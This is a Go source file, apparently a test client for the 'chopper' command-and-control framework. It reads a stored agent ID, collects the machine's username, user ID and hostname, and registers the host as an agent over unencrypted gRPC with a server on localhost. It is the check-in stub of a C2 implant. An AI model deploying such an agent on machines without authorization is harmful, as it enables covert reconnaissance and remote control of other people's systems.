package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"os"
	"os/user"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"

	pb "github.com/chopper-c2-framework/c2-chopper/grpc/proto"
)

const UUID_FILE = "uuid.test"
const HOST = "localhost:9002"

func loadUUID() (string, error) {
	file, err := os.OpenFile(UUID_FILE, os.O_RDONLY, 0644)
	if err != nil {
		if os.IsNotExist(err) {
			return "", nil
		}

		fmt.Println("Error opening file:", err)
		return "", err
	}
	defer file.Close()

	// Check if the file is empty
	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println("Error getting file info:", err)
		return "", err
	}

	if fileInfo.Size() == 0 {
		fmt.Println("The file is empty")
		return "", nil
	}

	content, err := io.ReadAll(file)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return "", err
	}

	return string(content), nil
}

func updateUUID(uuid string) {
	os.WriteFile(UUID_FILE, []byte(uuid), 0644)
}

func main() {
	uuid, _ := loadUUID()
	user, _ := user.Current()
	hostname, _ := os.Hostname()

	fmt.Println(uuid, user.Username, user.Uid)
	fmt.Println("Hostname:", hostname)

	conn, err := grpc.Dial(HOST, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		log.Panic("error connecting:", err)
		return
	}
	defer conn.Close()

	client := pb.NewAgentServiceClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()

	agent := &pb.Agent{
		Hostname: hostname,
		Username: user.Username,
		UserId:   user.Uid,
	}

	if len(uuid) != 0 {
		agent.Id = uuid
	}

	response, err := client.Connect(ctx, &pb.AgentConnectionRequest{Data: agent})
	if err != nil {
		log.Panic("error registering connection:", err)
		return
	}

	newUUID := response.GetUuid()
	fmt.Println(response)

	if newUUID != uuid {
		uuid = newUUID
		updateUUID(newUUID)
	}
}
